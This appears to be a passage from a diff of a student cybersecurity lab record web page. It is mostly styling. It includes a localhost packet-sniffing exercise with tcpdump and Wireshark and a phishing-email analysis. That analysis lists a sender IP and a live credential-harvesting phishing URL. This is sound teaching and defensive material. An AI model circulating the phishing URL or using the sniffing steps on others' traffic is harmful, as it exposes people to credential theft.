@@ -3,22 +3,22 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CS Lab Exam Guide</title>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<title>Cybersecurity Lab Record</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Syne:wght@400;600;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg: #060608;
-    --surface: #0e0e14;
-    --border: #1c1c28;
-    --text: #c8ccd8;
-    --muted: #4a4a60;
-    --white: #eef0f8;
-    --e15: #00c896;
-    --e16: #ff6b35;
-    --e17: #a78bfa;
-    --e18: #f59e0b;
-    --e19: #38bdf8;
-    --eu5: #e879f9;
+    --bg: #0a0e17;
+    --surface: #111827;
+    --surface2: #1a2235;
+    --border: #1e2d45;
+    --accent: #00d4ff;
+    --accent2: #ff4d6d;
+    --accent3: #39ff98;
+    --text: #e2e8f0;
+    --text-muted: #64748b;
+    --text-dim: #94a3b8;
+    --mono: 'IBM Plex Mono', monospace;
+    --sans: 'Syne', sans-serif;
   }
 
   * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -26,1473 +26,1749 @@
   body {
     background: var(--bg);
     color: var(--text);
-    font-family: 'Syne', sans-serif;
+    font-family: var(--sans);
     min-height: 100vh;
+    overflow-x: hidden;
   }
 
-  /* NAV */
-  nav {
-    position: sticky;
-    top: 0;
-    z-index: 100;
-    background: rgba(6,6,8,0.95);
-    backdrop-filter: blur(12px);
-    border-bottom: 1px solid var(--border);
-    display: flex;
-    align-items: center;
-    gap: 0;
-    padding: 0 24px;
-    height: 52px;
-    overflow-x: auto;
+  /* Grid background */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,212,255,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,212,255,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
   }
 
-  nav .logo {
-    font-size: 13px;
-    font-weight: 800;
-    color: var(--white);
-    letter-spacing: 2px;
-    margin-right: 28px;
-    white-space: nowrap;
-    text-transform: uppercase;
-  }
-
-  nav a {
-    text-decoration: none;
-    padding: 6px 14px;
-    border-radius: 6px;
-    font-size: 12px;
-    font-weight: 600;
-    white-space: nowrap;
-    transition: all 0.2s;
-    color: var(--muted);
-  }
-  nav a:hover { color: var(--white); background: var(--surface); }
-  nav a.e15 { color: var(--e15); }
-  nav a.e16 { color: var(--e16); }
-  nav a.e17 { color: var(--e17); }
-  nav a.e18 { color: var(--e18); }
-  nav a.e19 { color: var(--e19); }
-  nav a.eu5 { color: var(--eu5); }
-
-  /* HERO */
-  .hero {
-    padding: 56px 40px 40px;
+  .wrapper {
     max-width: 900px;
     margin: 0 auto;
+    padding: 60px 32px;
+    position: relative;
+    z-index: 1;
   }
 
-  .hero-badge {
-    display: inline-flex;
-    align-items: center;
-    gap: 7px;
+  /* Header */
+  header {
+    text-align: center;
+    margin-bottom: 72px;
+    animation: fadeDown 0.8s ease both;
+  }
+
+  .lab-badge {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--accent);
+    border: 1px solid var(--accent);
+    padding: 6px 16px;
+    margin-bottom: 24px;
+    position: relative;
+  }
+
+  .lab-badge::before, .lab-badge::after {
+    content: '';
+    position: absolute;
+    width: 6px;
+    height: 6px;
+    background: var(--accent);
+  }
+  .lab-badge::before { top: -3px; left: -3px; }
+  .lab-badge::after { bottom: -3px; right: -3px; }
+
+  h1 {
+    font-size: clamp(28px, 5vw, 48px);
+    font-weight: 800;
+    line-height: 1.1;
+    letter-spacing: -1px;
+    background: linear-gradient(135deg, #fff 0%, var(--accent) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    margin-bottom: 12px;
+  }
+
+  .header-sub {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--text-muted);
+    letter-spacing: 1px;
+  }
+
+  /* Experiment cards */
+  .experiment {
     background: var(--surface);
     border: 1px solid var(--border);
-    border-radius: 20px;
-    padding: 5px 14px;
-    font-size: 11px;
-    font-weight: 700;
-    color: var(--muted);
-    letter-spacing: 1.5px;
-    text-transform: uppercase;
-    margin-bottom: 20px;
-  }
-
-  .hero h1 {
-    font-size: clamp(28px, 5vw, 44px);
-    font-weight: 800;
-    color: var(--white);
-    line-height: 1.15;
-    margin-bottom: 14px;
-  }
-
-  .hero p {
-    font-size: 14px;
-    color: var(--muted);
-    line-height: 1.7;
-    max-width: 540px;
-  }
-
-  .exp-grid {
-    display: flex;
-    gap: 10px;
-    flex-wrap: wrap;
-    margin-top: 28px;
-  }
-
-  .exp-pill {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    padding: 8px 16px;
-    border-radius: 8px;
-    border: 1px solid;
-    font-size: 12px;
-    font-weight: 700;
-    text-decoration: none;
-    transition: all 0.2s;
-  }
-  .exp-pill:hover { transform: translateY(-2px); }
-  .exp-pill.e15 { border-color: var(--e15); color: var(--e15); background: #00c89610; }
-  .exp-pill.e16 { border-color: var(--e16); color: var(--e16); background: #ff6b3510; }
-  .exp-pill.e17 { border-color: var(--e17); color: var(--e17); background: #a78bfa10; }
-  .exp-pill.e18 { border-color: var(--e18); color: var(--e18); background: #f59e0b10; }
-  .exp-pill.e19 { border-color: var(--e19); color: var(--e19); background: #38bdf810; }
-  .exp-pill.eu5 { border-color: var(--eu5); color: var(--eu5); background: #e879f910; }
-
-  /* SECTIONS */
-  .section {
-    max-width: 900px;
-    margin: 0 auto 60px;
-    padding: 0 40px;
-  }
-
-  .section-header {
-    display: flex;
-    align-items: flex-start;
-    gap: 18px;
-    margin-bottom: 28px;
-    padding-bottom: 20px;
-    border-bottom: 1px solid var(--border);
-  }
-
-  .exp-number {
-    font-size: 11px;
-    font-weight: 800;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    padding: 6px 12px;
-    border-radius: 6px;
-    border: 1px solid;
-    white-space: nowrap;
-    margin-top: 4px;
-  }
-
-  .section-header h2 {
-    font-size: 22px;
-    font-weight: 800;
-    color: var(--white);
-    margin-bottom: 5px;
-  }
-
-  .tools-line {
-    font-size: 11px;
-    color: var(--muted);
-    font-family: 'JetBrains Mono', monospace;
-  }
-
-  /* STEPS */
-  .steps { display: flex; flex-direction: column; gap: 14px; }
-
-  .step {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 10px;
+    margin-bottom: 40px;
+    position: relative;
+    animation: fadeUp 0.6s ease both;
     overflow: hidden;
   }
 
-  .step-header {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    padding: 12px 16px;
+  .experiment:nth-child(1) { animation-delay: 0.1s; }
+  .experiment:nth-child(2) { animation-delay: 0.2s; }
+  .experiment:nth-child(3) { animation-delay: 0.3s; }
+  .experiment:nth-child(4) { animation-delay: 0.4s; }
+
+  .experiment::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+  }
+
+  .experiment:nth-child(1)::before { background: var(--accent); }
+  .experiment:nth-child(2)::before { background: var(--accent2); }
+  .experiment:nth-child(3)::before { background: var(--accent3); }
+  .experiment:nth-child(4)::before { background: #a78bfa; }
+
+  .exp-header {
+    padding: 28px 32px;
     border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: flex-start;
+    gap: 20px;
+    cursor: pointer;
+    user-select: none;
+    transition: background 0.2s;
+  }
+  .exp-header:hover { background: var(--surface2); }
+
+  .exp-number {
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 2px;
+    color: var(--text-muted);
+    padding-top: 4px;
+    flex-shrink: 0;
+    min-width: 32px;
   }
 
-  .step-num {
-    width: 24px;
-    height: 24px;
-    border-radius: 6px;
+  .exp-title-wrap { flex: 1; }
+
+  .exp-title {
+    font-size: 20px;
+    font-weight: 800;
+    letter-spacing: -0.3px;
+    line-height: 1.2;
+    margin-bottom: 6px;
+  }
+
+  .exp-subtitle {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text-muted);
+  }
+
+  .exp-toggle {
+    font-size: 20px;
+    color: var(--text-muted);
+    flex-shrink: 0;
+    transition: transform 0.3s;
+    line-height: 1;
+    padding-top: 4px;
+  }
+
+  .experiment.open .exp-toggle { transform: rotate(180deg); }
+
+  .exp-body {
+    display: none;
+    padding: 32px;
+  }
+
+  .experiment.open .exp-body { display: block; }
+
+  /* Section labels */
+  .section-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    margin-bottom: 10px;
     display: flex;
     align-items: center;
-    justify-content: center;
-    font-size: 11px;
-    font-weight: 800;
-    flex-shrink: 0;
-    font-family: 'JetBrains Mono', monospace;
+    gap: 10px;
   }
-
-  .step-title {
-    font-size: 13px;
-    font-weight: 700;
-    color: var(--white);
+  .section-label::after {
+    content: '';
     flex: 1;
+    height: 1px;
+    background: var(--border);
   }
 
-  .copy-btn {
-    background: transparent;
-    border: 1px solid var(--border);
-    color: var(--muted);
-    padding: 3px 10px;
-    border-radius: 5px;
-    font-size: 10px;
-    font-family: 'JetBrains Mono', monospace;
-    cursor: pointer;
-    transition: all 0.2s;
-    font-weight: 700;
-    letter-spacing: 0.5px;
-  }
-  .copy-btn:hover { border-color: #fff3; color: var(--white); }
-  .copy-btn.copied { color: #4ade80; border-color: #4ade80; }
+  .section { margin-bottom: 28px; }
 
-  .step-body { padding: 14px 16px; }
-
-  .note {
-    font-size: 12px;
-    color: var(--muted);
-    margin-bottom: 10px;
-    line-height: 1.6;
-  }
-
-  pre {
-    background: #080810;
-    border-radius: 7px;
-    padding: 14px 16px;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 12px;
+  p {
+    font-size: 15px;
     line-height: 1.75;
-    color: #b0bcd0;
-    overflow-x: auto;
-    white-space: pre;
-    border: 1px solid #14141e;
+    color: var(--text-dim);
+    margin-bottom: 12px;
   }
 
-  .comment { color: #3a4060; }
-
-  /* RESULT BOX */
-  .result-box {
-    margin-top: 20px;
-    padding: 16px 18px;
-    border-radius: 10px;
-    border-left: 3px solid;
-    background: var(--surface);
-  }
-
-  .result-box .label {
-    font-size: 10px;
-    font-weight: 800;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    margin-bottom: 7px;
-  }
-
-  .result-box p {
-    font-size: 12.5px;
-    line-height: 1.7;
-    color: var(--text);
-  }
-
-  /* DIVIDER */
-  .divider {
-    max-width: 900px;
-    margin: 0 auto 60px;
-    padding: 0 40px;
-    border: none;
-    border-top: 1px solid var(--border);
-  }
-
-  /* INFO TAGS */
-  .info-row {
+  /* Tool pills */
+  .tools {
     display: flex;
     flex-wrap: wrap;
     gap: 8px;
-    margin-bottom: 14px;
+    margin-bottom: 4px;
   }
 
-  .tag {
-    font-size: 10px;
-    font-weight: 700;
-    letter-spacing: 1px;
-    padding: 3px 10px;
-    border-radius: 4px;
-    background: var(--border);
-    color: var(--muted);
-    text-transform: uppercase;
-    font-family: 'JetBrains Mono', monospace;
+  .tool-pill {
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 5px 12px;
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+    background: var(--surface2);
+    white-space: nowrap;
   }
 
-  /* FOOTER */
-  footer {
-    text-align: center;
-    padding: 30px;
+  /* Steps */
+  .steps { list-style: none; }
+
+  .step {
+    display: flex;
+    gap: 16px;
+    padding: 14px 0;
+    border-bottom: 1px solid var(--border);
+    align-items: flex-start;
+  }
+  .step:last-child { border-bottom: none; }
+
+  .step-num {
+    font-family: var(--mono);
     font-size: 11px;
-    color: var(--muted);
-    border-top: 1px solid var(--border);
-    font-family: 'JetBrains Mono', monospace;
+    color: var(--accent);
+    flex-shrink: 0;
+    width: 28px;
+    padding-top: 2px;
   }
 
-  @media (max-width: 600px) {
-    .hero, .section { padding: 0 18px; }
-    .hero { padding-top: 32px; }
+  .experiment:nth-child(2) .step-num { color: var(--accent2); }
+  .experiment:nth-child(3) .step-num { color: var(--accent3); }
+  .experiment:nth-child(4) .step-num { color: #a78bfa; }
+
+  .step-text {
+    font-size: 14px;
+    color: var(--text-dim);
+    line-height: 1.65;
   }
+
+  code {
+    font-family: var(--mono);
+    font-size: 12px;
+    background: rgba(0,212,255,0.07);
+    color: var(--accent);
+    padding: 2px 7px;
+    border: 1px solid rgba(0,212,255,0.15);
+  }
+
+  .experiment:nth-child(2) code { background: rgba(255,77,109,0.07); color: var(--accent2); border-color: rgba(255,77,109,0.15); }
+  .experiment:nth-child(3) code { background: rgba(57,255,152,0.07); color: var(--accent3); border-color: rgba(57,255,152,0.15); }
+  .experiment:nth-child(4) code { background: rgba(167,139,250,0.07); color: #a78bfa; border-color: rgba(167,139,250,0.15); }
+
+  /* Code block */
+  .code-block {
+    background: #080c14;
+    border: 1px solid var(--border);
+    padding: 20px 24px;
+    overflow-x: auto;
+    margin: 4px 0;
+  }
+
+  .code-block pre {
+    font-family: var(--mono);
+    font-size: 12.5px;
+    line-height: 1.8;
+    color: #a8c0e0;
+    white-space: pre;
+  }
+
+  .code-block .kw { color: #7dd3fc; }
+  .code-block .fn { color: #86efac; }
+  .code-block .str { color: #fda4af; }
+  .code-block .cm { color: #475569; font-style: italic; }
+  .code-block .num { color: #fdba74; }
+
+  /* Q&A */
+  .qa-item {
+    padding: 12px 0;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    gap: 16px;
+    align-items: flex-start;
+  }
+  .qa-item:last-child { border-bottom: none; }
+  .qa-q {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-muted);
+    flex-shrink: 0;
+    padding-top: 2px;
+  }
+  .qa-a { font-size: 14px; color: var(--text-dim); line-height: 1.6; }
+
+  /* Conclusion */
+  .conclusion {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    padding: 18px 22px;
+    position: relative;
+    margin-top: 4px;
+  }
+
+  .conclusion-text {
+    font-size: 14px;
+    color: var(--text-dim);
+    line-height: 1.7;
+    margin: 0;
+  }
+
+  /* Sample output */
+  .output-block {
+    background: #080c14;
+    border: 1px solid var(--border);
+    padding: 16px 20px;
+  }
+
+  .output-line {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--accent3);
+    line-height: 1.9;
+  }
+
+  .output-line.label { color: var(--text-muted); margin-bottom: 6px; font-size: 11px; letter-spacing: 1px; }
+  .output-line.inp { color: var(--text-dim); }
+
+  /* Verdict */
+  .verdict {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(255,77,109,0.1);
+    border: 1px solid var(--accent2);
+    color: var(--accent2);
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 600;
+    padding: 8px 18px;
+    letter-spacing: 2px;
+    margin-top: 4px;
+  }
+  .verdict::before { content: '⚠'; }
+
+  /* Animations */
+  @keyframes fadeDown {
+    from { opacity: 0; transform: translateY(-20px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  /* Responsive */
+  @media (max-width: 600px) {
+    .wrapper { padding: 40px 16px; }
+    .exp-header { padding: 20px 20px; gap: 12px; }
+    .exp-body { padding: 20px; }
+    .code-block { padding: 14px 16px; }
+  }
+
+  .top-nav {
+    position: sticky; top: 0; z-index: 200;
+    background: rgba(10,14,23,0.97);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+    display: flex; align-items: center;
+    padding: 0 20px; height: 48px;
+    overflow-x: auto; scrollbar-width: none;
+  }
+  .top-nav::-webkit-scrollbar { display: none; }
+  .nav-logo {
+    font-family: var(--mono); font-size: 11px; font-weight: 600;
+    color: var(--accent); letter-spacing: 2px; margin-right: 16px;
+    white-space: nowrap; text-transform: uppercase; flex-shrink: 0;
+  }
+  .nav-link {
+    text-decoration: none; padding: 5px 10px;
+    font-family: var(--mono); font-size: 10px; font-weight: 600;
+    white-space: nowrap; color: var(--text-muted);
+    transition: color 0.2s, background 0.2s; border-radius: 4px; flex-shrink: 0;
+  }
+  .nav-link:hover { color: var(--text); background: var(--surface2); }
+  .copy-btn {
+    background: transparent; border: 1px solid var(--border);
+    color: var(--text-muted); padding: 3px 10px; border-radius: 4px;
+    font-size: 10px; font-family: var(--mono); cursor: pointer;
+    transition: all 0.2s; font-weight: 600; letter-spacing: 0.5px;
+  }
+  .copy-btn:hover { border-color: rgba(255,255,255,0.2); color: var(--text); }
+  .copy-btn.copied { color: var(--accent3); border-color: var(--accent3); }
+  .cb-wrap { display:flex; align-items:center; justify-content:space-between; margin-bottom:6px; }
+  .cb-label { font-family:var(--mono); font-size:10px; color:var(--text-muted); letter-spacing:1px; }
+  .sub-heading {
+    font-family: var(--mono); font-size: 10px; font-weight: 600;
+    letter-spacing: 3px; text-transform: uppercase; color: var(--accent);
+    margin: 22px 0 10px; padding-bottom: 6px; border-bottom: 1px dashed var(--border);
+  }
+  .experiment:nth-child(5)::before { background: #f59e0b; }
+  .experiment:nth-child(6)::before { background: #e879f9; }
+  .experiment:nth-child(7)::before { background: #00c896; }
+  .experiment:nth-child(8)::before { background: #ff6b35; }
+  .experiment:nth-child(9)::before { background: #a78bfa; }
+  .experiment:nth-child(10)::before { background: #f59e0b; }
+  .experiment:nth-child(11)::before { background: #38bdf8; }
+  .experiment:nth-child(12)::before { background: #e879f9; }
+
+
+  .top-nav {
+    position: sticky; top: 0; z-index: 200;
+    background: rgba(10,14,23,0.97);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+    display: flex; align-items: center;
+    padding: 0 20px; height: 48px;
+    overflow-x: auto; scrollbar-width: none;
+  }
+  .top-nav::-webkit-scrollbar { display: none; }
+  .nav-logo {
+    font-family: var(--mono); font-size: 11px; font-weight: 600;
+    color: var(--accent); letter-spacing: 2px; margin-right: 16px;
+    white-space: nowrap; text-transform: uppercase; flex-shrink: 0;
+  }
+  .nav-link {
+    text-decoration: none; padding: 5px 10px;
+    font-family: var(--mono); font-size: 10px; font-weight: 600;
+    white-space: nowrap; color: var(--text-muted);
+    transition: color 0.2s, background 0.2s; border-radius: 4px; flex-shrink: 0;
+  }
+  .nav-link:hover { color: var(--text); background: var(--surface2); }
+  .copy-btn {
+    background: transparent; border: 1px solid var(--border);
+    color: var(--text-muted); padding: 3px 10px; border-radius: 4px;
+    font-size: 10px; font-family: var(--mono); cursor: pointer;
+    transition: all 0.2s; font-weight: 600; letter-spacing: 0.5px;
+  }
+  .copy-btn:hover { border-color: rgba(255,255,255,0.2); color: var(--text); }
+  .copy-btn.copied { color: var(--accent3); border-color: var(--accent3); }
+  .cb-wrap { display:flex; align-items:center; justify-content:space-between; margin-bottom:6px; }
+  .cb-label { font-family:var(--mono); font-size:10px; color:var(--text-muted); letter-spacing:1px; }
+
 </style>
 </head>
 <body>
 
-<!-- NAV -->
-<nav>
-  <div class="logo">🔐 CS LAB</div>
-  <a href="#exp15" class="e15">Exp 15 · Mobile</a>
-  <a href="#exp16" class="e16">Exp 16 · IoT</a>
-  <a href="#exp17" class="e17">Exp 17 · Forensics</a>
-  <a href="#exp18" class="e18">Exp 18 · Logs</a>
-  <a href="#exp19" class="e19">Exp 19 · Wireshark</a>
-  <a href="#expu5" class="eu5">U5·E1 · Privacy Audit</a>
+<nav class="top-nav">
+  <span class="nav-logo">&#128274; CS LAB</span>
+  <a href="#exp01" class="nav-link">01&#183;Sniff</a>
+  <a href="#exp02" class="nav-link">02&#183;Phish</a>
+  <a href="#exp03" class="nav-link">03&#183;Pwd</a>
+  <a href="#exp04" class="nav-link">04&#183;Firewall</a>
+  <a href="#exp05" class="nav-link">05&#183;XSS</a>
+  <a href="#exp06" class="nav-link">06&#183;SQLi</a>
+  <a href="#exp07" class="nav-link">07&#183;Auth</a>
+  <a href="#exp08" class="nav-link">08&#183;Mobile</a>
+  <a href="#exp09" class="nav-link">09&#183;IoT</a>
+  <a href="#exp10" class="nav-link">10&#183;Forensics</a>
+  <a href="#exp11" class="nav-link">11&#183;Logs</a>
+  <a href="#exp12" class="nav-link">12&#183;Wireshark</a>
+  <a href="#exp13" class="nav-link">13&#183;Privacy</a>
 </nav>
 
-<!-- HERO -->
-<div class="hero">
-  <div class="hero-badge">🎓 Internal Lab Exam</div>
-  <h1>CS Security Lab<br>Complete Guide</h1>
-  <p>All 5 experiments. Every command. Step by step. No fluff.</p>
-  <div class="exp-grid">
-    <a href="#exp15" class="exp-pill e15">📱 Exp 15 — Mobile Security</a>
-    <a href="#exp16" class="exp-pill e16">🌐 Exp 16 — IoT Security</a>
-    <a href="#exp17" class="exp-pill e17">💾 Exp 17 — Disk Forensics</a>
-    <a href="#exp18" class="exp-pill e18">📋 Exp 18 — Log Analysis</a>
-    <a href="#exp19" class="exp-pill e19">🦈 Exp 19 — Wireshark</a>
-    <a href="#expu5" class="exp-pill eu5">🔏 U5·E1 — Privacy Audit</a>
-  </div>
-</div>
+<nav class="top-nav">
+  <span class="nav-logo">&#128274; CS LAB</span>
+  <a href="#exp01" class="nav-link">01&middot;Sniff</a>
+  <a href="#exp02" class="nav-link">02&middot;Phish</a>
+  <a href="#exp03" class="nav-link">03&middot;Pwd</a>
+  <a href="#exp04" class="nav-link">04&middot;FW</a>
+  <a href="#exp05" class="nav-link">05&middot;XSS</a>
+  <a href="#exp06" class="nav-link">06&middot;SQLi</a>
+  <a href="#exp07" class="nav-link">07&middot;Auth</a>
+  <a href="#exp08" class="nav-link">08&middot;Mobile</a>
+  <a href="#exp09" class="nav-link">09&middot;IoT</a>
+  <a href="#exp10" class="nav-link">10&middot;Forensics</a>
+  <a href="#exp11" class="nav-link">11&middot;Logs</a>
+  <a href="#exp12" class="nav-link">12&middot;Wireshark</a>
+  <a href="#exp13" class="nav-link">13&middot;Privacy</a>
+</nav>
 
-<!-- ═══════════════════════════════════════════ -->
-<!-- EXP 15 -->
-<!-- ═══════════════════════════════════════════ -->
-<div class="section" id="exp15">
-  <div class="section-header">
-    <div class="exp-number" style="border-color:var(--e15);color:var(--e15);">EXP 15</div>
-    <div>
-      <h2>Mobile Security — Android Traffic Interception</h2>
-      <div class="tools-line">Android Studio · Burp Suite · ADB · Windows CMD</div>
+<div class="wrapper">
+
+  <header>
+    <div class="lab-badge">Lab Record · Cybersecurity</div>
+    <h1>Network Security<br>Experiments</h1>
+    <p class="header-sub">Unit 1 — Practical Exercises</p>
+  </header>
+
+  <!-- EXP 1 -->
+  <div class="experiment open" onclick="toggle(this)">
+    <div class="exp-header">
+      <div class="exp-number" id="exp01">01</div>
+      <div class="exp-title-wrap">
+        <div class="exp-title">Packet Sniffing & Network Traffic Analysis</div>
+        <div class="exp-subtitle">tcpdump · Wireshark · HTTP · Kali Linux</div>
+      </div>
+      <div class="exp-toggle">▾</div>
+    </div>
+    <div class="exp-body">
+
+      <div class="section">
+        <div class="section-label">Objective</div>
+        <p>Capture live network packets, analyze them, and understand what information an attacker can observe. Since HTTP is unencrypted, all transmitted data is visible in plain text to anyone capturing the traffic.</p>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Requirements</div>
+        <div class="tools">
+          <span class="tool-pill">Kali Linux (VirtualBox)</span>
+          <span class="tool-pill">Wireshark (built-in)</span>
+          <span class="tool-pill">Python HTTP Server</span>
+          <span class="tool-pill">tcpdump</span>
+          <span class="tool-pill">Firefox</span>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Procedure</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">01</span><span class="step-text">Open <strong>Kali Linux</strong> in Oracle VirtualBox and launch the terminal.</span></li>
+          <li class="step"><span class="step-num">02</span><span class="step-text">Open a terminal and start a local HTTP server on port 8080:<br><code>python3 -m http.server 8080</code></span></li>
+          <li class="step"><span class="step-num">03</span><span class="step-text">Open a <strong>second terminal</strong> and start packet capture, saving to a file:<br><code>sudo tcpdump -i any -w capture.pcap port 8080</code></span></li>
+          <li class="step"><span class="step-num">04</span><span class="step-text">Open <strong>Firefox</strong> and navigate to <code>http://localhost:8080</code>. Refresh the page several times to generate traffic.</span></li>
+          <li class="step"><span class="step-num">05</span><span class="step-text">Return to the tcpdump terminal and press <code>Ctrl + C</code> to stop capture. The packets are saved as <code>capture.pcap</code>.</span></li>
+          <li class="step"><span class="step-num">06</span><span class="step-text">Open <strong>File Manager</strong> → locate <code>capture.pcap</code> in the Home folder → double-click to open in Wireshark.</span></li>
+          <li class="step"><span class="step-num">07</span><span class="step-text">In Wireshark's filter bar, type <code>http.request.method == "POST"</code> and press Enter to isolate login packets.</span></li>
+          <li class="step"><span class="step-num">08</span><span class="step-text">Click on any packet to inspect its payload. Browser details, OS info, and any form-submitted credentials appear in plain text.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Conclusion</div>
+        <div class="conclusion">
+          <p class="conclusion-text">Packets were successfully captured and analyzed. Sensitive data is fully visible when HTTP is used. Packet sniffing demonstrates that unencrypted communication is unsafe — <strong>HTTPS is necessary</strong> to protect data in transit.</p>
+        </div>
+      </div>
+
     </div>
   </div>
 
-  <div class="info-row">
-    <span class="tag">Aim</span>
-    <span style="font-size:12px;color:var(--muted);">Intercept HTTP and HTTPS traffic from Android emulator using Burp Suite as a proxy.</span>
+  <!-- EXP 2 -->
+  <div class="experiment" onclick="toggle(this)">
+    <div class="exp-header">
+      <div class="exp-number" id="exp02">02</div>
+      <div class="exp-title-wrap">
+        <div class="exp-title">Analyzing Phishing Emails</div>
+        <div class="exp-subtitle">EML Analyzer · VirusTotal · SPF / DKIM / DMARC</div>
+      </div>
+      <div class="exp-toggle">▾</div>
+    </div>
+    <div class="exp-body">
+
+      <div class="section">
+        <div class="section-label">Objective</div>
+        <p>Analyze a suspicious email using EML Analyzer and VirusTotal to identify phishing indicators based on technical header and authentication data.</p>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Tools Used</div>
+        <div class="tools">
+          <span class="tool-pill">Online EML Analyzer</span>
+          <span class="tool-pill">VirusTotal</span>
+          <span class="tool-pill">Sample .eml file</span>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Part A — EML Analyzer Results</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">Subject</span><span class="step-text"><strong>Warning: Final Notice</strong> — urgency-based subject line</span></li>
+          <li class="step"><span class="step-num">From</span><span class="step-text"><code>sues@nnwifi.com</code> — display name fakes malware-traffic-analysis.net</span></li>
+          <li class="step"><span class="step-num">To</span><span class="step-text"><code>brad@malware-traffic-analysis.net</code></span></li>
+          <li class="step"><span class="step-num">Sender IP</span><span class="step-text"><code>94.100.31.27</code> — Reverse DNS: 94-100-31-27.static.hvvc.us</span></li>
+          <li class="step"><span class="step-num">Auth</span><span class="step-text">SPF: <strong>Failed</strong> · DKIM: Not signed · DMARC: Not aligned · Message-ID: Missing</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Part B — VirusTotal Analysis</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">IP</span><span class="step-text"><code>94.100.31.27</code> — Located in Netherlands, ASN: AS29802 (HVC-AS)</span></li>
+          <li class="step"><span class="step-num">Score</span><span class="step-text">1 / 93 vendors flagged as malicious — not widely blacklisted, but suspicious reputation</span></li>
+          <li class="step"><span class="step-num">URL</span><span class="step-text">Suspicious link extracted: <code>servervirto.com.co/ed/trn/update?email=...</code> — does not match sender domain, uses foreign TLD, harvests credentials</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Answers</div>
+        <div class="qa-item"><span class="qa-q">Q1</span><span class="qa-a">Full sender email: <code>sues@nnwifi.com</code></span></div>
+        <div class="qa-item"><span class="qa-q">Q2</span><span class="qa-a">Sending domain: <code>nnwifi.com</code></span></div>
+        <div class="qa-item"><span class="qa-q">Q3</span><span class="qa-a">Sender IP: <code>94.100.31.27</code></span></div>
+        <div class="qa-item"><span class="qa-q">Q4</span><span class="qa-a">Blacklisted? Yes — 1/93 VirusTotal vendors flagged it malicious</span></div>
+        <div class="qa-item"><span class="qa-q">Q5</span><span class="qa-a">SPF result: <strong>FAIL</strong></span></div>
+        <div class="qa-item"><span class="qa-q">Q6</span><span class="qa-a">Suspicious URL: <code>https://servervirto.com.co/ed/trn/update?email=brad@malware-traffic-analysis.net</code></span></div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Final Verdict</div>
+        <div class="verdict">PHISHING CONFIRMED</div>
+      </div>
+
+    </div>
   </div>
 
-  <div class="steps">
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#00c89620;color:var(--e15);">1</div>
-        <div class="step-title">Open CMD → Navigate to Emulator Folder</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+  <!-- EXP 3 -->
+  <div class="experiment" onclick="toggle(this)">
+    <div class="exp-header">
+      <div class="exp-number" id="exp03">03</div>
+      <div class="exp-title-wrap">
+        <div class="exp-title">Password Strength Testing</div>
+        <div class="exp-subtitle">Python · Regex · Input Validation</div>
       </div>
-      <div class="step-body">
-        <pre><span class="comment"># Open Command Prompt on Windows, then:</span>
-cd C:\Users\Admin\AppData\Local\Android\Sdk\emulator</pre>
-      </div>
+      <div class="exp-toggle">▾</div>
     </div>
+    <div class="exp-body">
 
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#00c89620;color:var(--e15);">2</div>
-        <div class="step-title">List Available Virtual Devices</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <div class="section">
+        <div class="section-label">Objective</div>
